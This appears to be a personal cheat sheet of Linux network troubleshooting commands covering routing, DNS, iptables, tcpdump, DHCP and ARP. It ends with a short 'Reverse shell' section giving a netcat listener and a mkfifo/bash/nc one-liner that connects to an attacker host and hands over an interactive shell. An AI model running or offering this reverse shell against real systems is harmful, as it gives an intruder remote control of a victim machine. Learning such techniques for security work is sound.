## Utilities commands for troubleshooting a network

ping <server>

route -n
  show default gateway and other routes without resolving the DNS

route
  show default gateway and other routes trying to resolve the DNS

ifconfig
  information about the network adapters

dig
  same as nslookup but it shows in a format that is much easier to parse when working with scripts

dig <server> MX
  show MX records. Used to direct e-mail messages for the right destination.

iptables -L
  show all the rules current configured

iptables -A INPUT -p tcp --dport 21 -j DROP
  appends a firewall rule for incoming tcp connections on port 21 (ftp) to be dropped

iptables -L INPUT --line-numbers
  show all INPUT rules current configured and display it line number.

iptables -D INPUT 1
  deletes INPUT rule with line number 1.

iptablas -D INPUT -p tcp --dport 21 -j DROP
  same as above but delete the rule by the rule it self.

tcpdump -i <interface> -n
  show all the traffic coming in and out the interface. Option -n don't do the reverse dns lookup.

sudo dhclient
  obtains an ip from the dhcp server

sudo dhclient -r
  release the ip address

arp
  shows routing table (layer 2 mac address  <->  layer 3 ipv4 address)
  useful flags: -a (shows dns vs mac) -n (shows ip vs mac)

ip -6 neighbor|neigh show
  shows routing table (layer 2 mac addres <-> layer 3 ipv6 address)
  man page: man ip-neighbor


### Reverse shell

nc -lnvp <port_number> 
  attacker will listen for connections on port number

mkfifo /tmp/<file_to_be_used_as_pipe>
  creates a file that will be used as a pipe/socket for enabling the attacked system to offer a shell

cat /tmp/<file_created_above> | /bin/bash -i 2>&1 | nc <attacker-ip> <port-number> > /tmp/<file-created-above>
  connects to the attacker machine and offers a shell for the attacker to control the attacked machine


